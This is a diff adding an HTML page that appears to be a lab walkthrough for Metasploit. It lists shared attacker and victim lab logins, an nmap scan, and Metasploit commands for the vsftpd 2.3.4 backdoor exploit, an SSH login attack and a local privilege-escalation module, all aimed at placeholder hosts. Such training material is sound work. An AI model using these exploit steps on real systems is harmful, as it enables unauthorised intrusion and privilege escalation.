@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit Exploitation Guide</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+        }
+        h2, h3 {
+            color: #333;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        code {
+            background-color: #f0f0f0;
+            padding: 5px;
+            border-radius: 5px;
+        }
+        pre {
+            background-color: #f0f0f0;
+            padding: 10px;
+            border-radius: 5px;
+            white-space: pre-wrap;
+        }
+        ul {
+            list-style-type: disc;
+            padding-left: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Metasploit Exploitation Guide</h2>
+        <p>This guide explains how to exploit vulnerabilities using Metasploit.</p>
+    
+        <h3>Step 1: Login to Both Systems (Perform on Attacker and Victim Systems)</h3>
+        <ul>
+            <li><strong>Attacker System:</strong> Username: <code>user</code>, Password: <code>VSecureSphere</code></li>
+            <li><strong>Victim System:</strong> Username: <code>user</code>, Password: <code>VSecureSphere</code></li>
+        </ul>
+    
+        <h3>Step 2: Acquiring Victim's IP (Perform on Victim System)</h3>
+        <p>Run the following command on the victim system:</p>
+        <pre><code>ifconfig</code></pre>
+        <p>Note the IP address assigned to the victim.</p>
+    
+        <h3>Step 3: Scanning Victim (Perform on Attacker System)</h3>
+        <p>Run Nmap from the attacker system:</p>
+        <pre><code>nmap -p 22,21,80,445 &lt;VICTIM-IP&gt;</code></pre>
+    
+        <h3>Step 4: Exploiting FTP Vulnerability (Perform on Attacker System)</h3>
+        <p>Use the following Metasploit commands to exploit the vsftpd vulnerability:</p>
+        <pre><code>
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS &lt;VICTIM-IP&gt;
+set RPORT 21
+exploit
+        </code></pre>
+    
+        <h3>Step 5: Exploiting SSH (Brute Force) (Perform on Attacker System)</h3>
+        <p>Use a brute force attack on SSH:</p>
+        <pre><code>
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS &lt;VICTIM-IP&gt;
+set USERNAME hacker
+set PASSWORD password
+run
+        </code></pre>
+    
+        <h3>Step 6: Privilege Escalation (Perform on Attacker System)</h3>
+        <p>Once a session is obtained, escalate privileges:</p>
+        <pre><code>
+use exploit/linux/local/sudo_bypass
+set SESSION &lt;SESSION-ID&gt;
+exploit
+        </code></pre>
+    </div>
+</body>
+</html>
